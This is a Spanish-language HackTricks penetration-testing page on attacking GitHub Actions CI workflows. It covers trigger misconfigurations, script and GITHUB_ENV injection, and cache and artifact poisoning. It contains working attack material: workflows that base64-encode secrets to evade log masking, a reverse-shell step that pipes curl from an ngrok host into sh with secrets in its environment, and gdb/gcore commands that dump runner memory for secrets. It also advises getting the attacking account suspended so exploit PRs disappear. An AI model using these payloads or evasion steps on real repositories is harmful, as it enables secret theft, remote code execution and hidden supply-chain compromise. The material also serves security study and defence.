# Abusando de Github Actions

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Información Básica

En esta página encontrarás:

* Un **resumen de todos los impactos** de un atacante que logra acceder a una Github Action
* Diferentes formas de **obtener acceso a una acción**:
* Tener **permisos** para crear la acción
* Abusar de los disparadores relacionados con **pull request**
* Abusar de **otras técnicas de acceso externo**
* **Pivotar** desde un repositorio ya comprometido
* Finalmente, una sección sobre **técnicas de post-explotación para abusar de una acción desde dentro** (causar los impactos mencionados)

## Resumen de Impactos

Para una introducción sobre [**Github Actions revisa la información básica**](../basic-github-information.md#github-actions).

En caso de que puedas **ejecutar acciones arbitrarias de Github/inyectar código** en un **repositorio**, podrías ser capaz de:

* **Robar** los **secretos** de ese repo/organización.
* Si solo puedes inyectar, puedes robar lo que ya esté presente en el workflow.
* Abusar de los **privilegios del repo** para acceder a otras plataformas como AWS y GCP.
* **Ejecutar código en trabajadores personalizados** (si se usan trabajadores personalizados) e intentar pivotar desde allí.
* **Sobrescribir** el **código** del repositorio.
* Esto depende de los privilegios del `GITHUB_TOKEN` (si los hay).
* **Comprometer** **despliegues** y otros **artefactos**.
* Si el código está desplegando o almacenando algo, podrías modificar eso y obtener más acceso.

## GITHUB\_TOKEN

Este "**secreto**" (proveniente de `${{ secrets.GITHUB_TOKEN }}` y `${{ github.token }}`) se da cuando el administrador habilita esta opción:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Este token es el mismo que usará una **Aplicación de Github**, por lo que puede acceder a los mismos endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github debería lanzar un [**flujo**](https://github.com/github/roadmap/issues/74) que **permita el acceso entre repositorios** dentro de GitHub, para que un repo pueda acceder a otros repos internos usando el `GITHUB_TOKEN`.
{% endhint %}

Puedes ver los posibles **permisos** de este token en: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Ten en cuenta que el token **expira después de que el trabajo se haya completado**.\
Estos tokens se ven así: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algunas cosas interesantes que puedes hacer con este token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Aprobar PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Ten en cuenta que en varias ocasiones podrás encontrar **tokens de usuario de github dentro de los entornos de Github Actions o en los secretos**. Estos tokens pueden darte más privilegios sobre el repositorio y la organización.
{% endhint %}

<details>

<summary>Listar secretos en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener shell inversa con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Es posible verificar los permisos otorgados a un Github Token en los repositorios de otros usuarios **revisando los logs** de las acciones:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Ejecución Permitida

{% hint style="info" %}
Esta sería la forma más fácil de comprometer las acciones de Github, ya que este caso supone que tienes acceso para **crear un nuevo repositorio en la organización**, o tienes **privilegios de escritura sobre un repositorio**.

Si estás en este escenario, puedes simplemente revisar las [técnicas de Post Explotación](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Ejecución desde la Creación de Repositorio

En caso de que los miembros de una organización puedan **crear nuevos repositorios** y puedas ejecutar acciones de github, puedes **crear un nuevo repositorio y robar los secretos establecidos a nivel de organización**.

### Ejecución desde una Nueva Rama

Si puedes **crear una nueva rama en un repositorio que ya contiene una Github Action** configurada, puedes **modificarla**, **subir** el contenido y luego **ejecutar esa acción desde la nueva rama**. De esta manera puedes **exfiltrar secretos a nivel de repositorio y organización** (pero necesitas saber cómo se llaman).

Puedes hacer que la acción modificada sea ejecutable **manualmente**, cuando se **crea un PR** o cuando **se sube algún código** (dependiendo de qué tan ruidoso quieras ser):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Ejecución Bifurcada

{% hint style="info" %}
Hay diferentes desencadenantes que podrían permitir a un atacante **ejecutar una Github Action de otro repositorio**. Si esas acciones desencadenables están mal configuradas, un atacante podría comprometerlas.
{% endhint %}

### `pull_request`

El desencadenante del flujo de trabajo **`pull_request`** ejecutará el flujo de trabajo cada vez que se reciba una solicitud de extracción con algunas excepciones: por defecto, si es la **primera vez** que estás **colaborando**, algún **mantenedor** necesitará **aprobar** la **ejecución** del flujo de trabajo:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Como la **limitación por defecto** es para colaboradores de **primera vez**, podrías contribuir **arreglando un error/typo válido** y luego enviar **otras PRs para abusar de tus nuevos privilegios de `pull_request`**.

**Probé esto y no funciona**: ~~Otra opción sería crear una cuenta con el nombre de alguien que contribuyó al proyecto y eliminó su cuenta.~~
{% endhint %}

Además, por defecto **previene permisos de escritura** y **acceso a secretos** al repositorio objetivo como se menciona en la [**documentación**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Con la excepción de `GITHUB_TOKEN`, **los secretos no se pasan al runner** cuando un flujo de trabajo se desencadena desde un repositorio **bifurcado**. El **`GITHUB_TOKEN` tiene permisos de solo lectura** en solicitudes de extracción **desde repositorios bifurcados**.

Un atacante podría modificar la definición de la Github Action para ejecutar cosas arbitrarias y agregar acciones arbitrarias. Sin embargo, no podrá robar secretos ni sobrescribir el repositorio debido a las limitaciones mencionadas.

{% hint style="danger" %}
**Sí, si el atacante cambia en la PR la github action que se desencadenará, su Github Action será la utilizada y no la del repositorio original!**
{% endhint %}

Como el atacante también controla el código que se ejecuta, incluso si no hay secretos o permisos de escritura en el `GITHUB_TOKEN`, un atacante podría, por ejemplo, **subir artefactos maliciosos**.

### **`pull_request_target`**

El desencadenante del flujo de trabajo **`pull_request_target`** tiene **permiso de escritura** en el repositorio objetivo y **acceso a secretos** (y no pide permiso).

Ten en cuenta que el desencadenante del flujo de trabajo **`pull_request_target`** **se ejecuta en el contexto base** y no en el dado por la PR (para **no ejecutar código no confiable**). Para más información sobre `pull_request_target` [**consulta la documentación**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Además, para más información sobre este uso específico y peligroso, consulta este [**blog de github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Podría parecer que porque el **flujo de trabajo ejecutado** es el definido en la **base** y **no en la PR** es **seguro** usar **`pull_request_target`**, pero hay **algunos casos en los que no lo es**.

Y este tendrá **acceso a secretos**.

### `workflow_run`

El desencadenante [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permite ejecutar un flujo de trabajo desde otro diferente cuando está `completed`, `requested` o `in_progress`.

En este ejemplo, un flujo de trabajo está configurado para ejecutarse después de que el flujo de trabajo separado "Run Tests" se complete:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Además, según la documentación: El flujo de trabajo iniciado por el evento `workflow_run` puede **acceder a secretos y escribir tokens, incluso si el flujo de trabajo anterior no podía**.

Este tipo de flujo de trabajo podría ser atacado si **depende** de un **flujo de trabajo** que puede ser **activado** por un usuario externo a través de **`pull_request`** o **`pull_request_target`**. Un par de ejemplos vulnerables pueden ser [**encontrados en este blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** El primero consiste en que el flujo de trabajo activado por **`workflow_run`** descarga el código del atacante: `${{ github.event.pull_request.head.sha }}`\
El segundo consiste en **pasar** un **artefacto** del código **no confiable** al flujo de trabajo **`workflow_run`** y usar el contenido de este artefacto de una manera que lo hace **vulnerable a RCE**.

### `workflow_call`

TODO

TODO: Verificar si cuando se ejecuta desde un pull\_request el código usado/descargado es el del origen o del PR bifurcado

## Abusando de la Ejecución Bifurcada

Hemos mencionado todas las formas en que un atacante externo podría lograr que un flujo de trabajo de github se ejecute, ahora veamos cómo estas ejecuciones, si están mal configuradas, podrían ser abusadas:

### Ejecución de checkout no confiable

En el caso de **`pull_request`,** el flujo de trabajo se ejecutará en el **contexto del PR** (por lo que ejecutará el **código malicioso del PR**), pero alguien necesita **autorizarlo primero** y se ejecutará con algunas [limitaciones](./#pull\_request).

En caso de un flujo de trabajo que use **`pull_request_target` o `workflow_run`** que dependa de un flujo de trabajo que puede ser activado desde **`pull_request_target` o `pull_request`** se ejecutará el código del repositorio original, por lo que el **atacante no puede controlar el código ejecutado**.

{% hint style="danger" %}
Sin embargo, si la **acción** tiene un **checkout explícito del PR** que **obtendrá el código del PR** (y no de la base), usará el código controlado por el atacante. Por ejemplo (ver línea 12 donde se descarga el código del PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSEGURO. Proporcionado solo como ejemplo.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

El código potencialmente **no confiable se está ejecutando durante `npm install` o `npm build`** ya que los scripts de construcción y los **paquetes referenciados están controlados por el autor del PR**.

{% hint style="warning" %}
Un github dork para buscar acciones vulnerables es: `event.pull_request pull_request_target extension:yml` sin embargo, hay diferentes formas de configurar los trabajos para que se ejecuten de manera segura incluso si la acción está configurada de manera insegura (como usar condicionales sobre quién es el actor que genera el PR).
{% endhint %}

### Inyecciones de Script en el Contexto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Tenga en cuenta que hay ciertos [**contextos de github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cuyos valores son **controlados** por el **usuario** que crea el PR. Si la acción de github está usando esos **datos para ejecutar algo**, podría llevar a **ejecución arbitraria de código:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Inyección de Script en GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

De la documentación: Puedes hacer que una **variable de entorno esté disponible para cualquier paso subsecuente** en un trabajo de flujo de trabajo definiendo o actualizando la variable de entorno y escribiéndola en el archivo de entorno **`GITHUB_ENV`**.

Si un atacante pudiera **inyectar cualquier valor** dentro de esta **variable de entorno**, podría inyectar variables de entorno que podrían ejecutar código en pasos siguientes como **LD\_PRELOAD** o **NODE\_OPTIONS**.

Por ejemplo ([**este**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) y [**este**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagina un flujo de trabajo que confía en un artefacto subido para almacenar su contenido dentro de la variable de entorno **`GITHUB_ENV`**. Un atacante podría subir algo como esto para comprometerlo:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Acciones de Github de Terceros Vulnerables

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Como se menciona en [**esta publicación de blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), esta Acción de Github permite acceder a artefactos de diferentes flujos de trabajo e incluso repositorios.

El problema es que si el parámetro **`path`** no está configurado, el artefacto se extrae en el directorio actual y puede sobrescribir archivos que podrían ser utilizados o incluso ejecutados más tarde en el flujo de trabajo. Por lo tanto, si el Artefacto es vulnerable, un atacante podría abusar de esto para comprometer otros flujos de trabajo que confían en el Artefacto.

Ejemplo de flujo de trabajo vulnerable:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Esto podría ser atacado con este flujo de trabajo:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Otro Acceso Externo

### Secuestro de Repositorio de Namespace Eliminado

Si una cuenta cambia su nombre, otro usuario podría registrar una cuenta con ese nombre después de un tiempo. Si un repositorio tenía **menos de 100 estrellas antes del cambio de nombre**, Github permitirá al nuevo usuario registrado con el mismo nombre crear un **repositorio con el mismo nombre** que el eliminado.

{% hint style="danger" %}
Entonces, si una acción está usando un repositorio de una cuenta inexistente, aún es posible que un atacante pueda crear esa cuenta y comprometer la acción.
{% endhint %}

Si otros repositorios estaban usando **dependencias de los repositorios de este usuario**, un atacante podrá secuestrarlos. Aquí tienes una explicación más completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
En esta sección hablaremos sobre técnicas que permitirían **pivotar de un repositorio a otro** suponiendo que tenemos algún tipo de acceso en el primero (revisa la sección anterior).
{% endhint %}

### Envenenamiento de Caché

Se mantiene una caché entre **ejecuciones de workflow en la misma rama**. Lo que significa que si un atacante **compromete** un **paquete** que luego se almacena en la caché y es **descargado** y ejecutado por un workflow **más privilegiado**, también podrá **comprometer** ese workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Envenenamiento de Artefactos

Los workflows podrían usar **artefactos de otros workflows e incluso repositorios**, si un atacante logra **comprometer** la Github Action que **sube un artefacto** que luego es usado por otro workflow, podría **comprometer los otros workflows**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Explotación desde una Acción

### Accediendo a AWS y GCP vía OIDC

Revisa las siguientes páginas:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Accediendo a secretos <a href="#accessing-secrets" id="accessing-secrets"></a>

Si estás inyectando contenido en un script, es interesante saber cómo puedes acceder a secretos:

* Si el secreto o token está configurado como una **variable de entorno**, se puede acceder directamente a través del entorno usando **`printenv`**.

<details>

<summary>Listar secretos en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener shell inversa con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Si el secreto se usa **directamente en una expresión**, el script de shell generado se almacena **en disco** y es accesible.
* ```bash
cat /home/runner/work/_temp/*
```
* Para una acción de JavaScript, los secretos se envían a través de variables de entorno
* ```bash
ps axe | grep node
```
* Para una **acción personalizada**, el riesgo puede variar dependiendo de cómo un programa esté usando el secreto que obtuvo del **argumento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusando de runners autohospedados

La forma de encontrar qué **Github Actions se están ejecutando en infraestructura no-Github** es buscar **`runs-on: self-hosted`** en la configuración yaml de Github Action.

Los runners **autohospedados** podrían tener acceso a **información extra sensible**, a otros **sistemas de red** (¿endpoints vulnerables en la red? ¿servicio de metadatos?) o, incluso si está aislado y destruido, **más de una acción podría ejecutarse al mismo tiempo** y la maliciosa podría **robar los secretos** de la otra.

En los runners autohospedados también es posible obtener los **secretos del proceso \_Runner.Listener\_** que contendrá todos los secretos de los flujos de trabajo en cualquier paso al volcar su memoria:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Consulta [**esta publicación para más información**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro de Imágenes Docker de Github

Es posible crear acciones de Github que **construyan y almacenen una imagen Docker dentro de Github**.\
Un ejemplo se puede encontrar en el siguiente desplegable:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como pudiste ver en el código anterior, el registro de Github está alojado en **`ghcr.io`**.

Un usuario con permisos de lectura sobre el repositorio podrá entonces descargar la Imagen Docker usando un token de acceso personal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Luego, el usuario podría buscar **secretos filtrados en las capas de la imagen de Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Información sensible en los registros de Github Actions

Incluso si **Github** intenta **detectar valores secretos** en los registros de las acciones y **evitar mostrarlos**, **otros datos sensibles** que podrían haberse generado en la ejecución de la acción no serán ocultados. Por ejemplo, un JWT firmado con un valor secreto no será ocultado a menos que esté [específicamente configurado](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Cubriendo tus huellas

(Técnica de [**aquí**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Primero que todo, cualquier PR levantado es claramente visible para el público en Github y para la cuenta de GitHub objetivo. En GitHub por defecto, **no podemos eliminar un PR de internet**, pero hay un giro. Para las cuentas de Github que son **suspendidas** por Github, todos sus **PRs son automáticamente eliminados** y removidos de internet. Así que para ocultar tu actividad necesitas que tu **cuenta de GitHub sea suspendida o que tu cuenta sea marcada**. Esto **ocultaría todas tus actividades** en GitHub de internet (básicamente eliminaría todos tus PR de explotación).

Una organización en GitHub es muy proactiva en reportar cuentas a GitHub. Todo lo que necesitas hacer es compartir “alguna cosa” en Issue y se asegurarán de que tu cuenta sea suspendida en 12 horas :p y ahí lo tienes, tu explotación invisible en github.

{% hint style="warning" %}
La única manera para que una organización se dé cuenta de que ha sido objetivo es revisar los registros de GitHub desde SIEM ya que desde la UI de GitHub el PR sería eliminado.
{% endhint %}

## Herramientas

Las siguientes herramientas son útiles para encontrar flujos de trabajo de Github Action e incluso encontrar los vulnerables:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
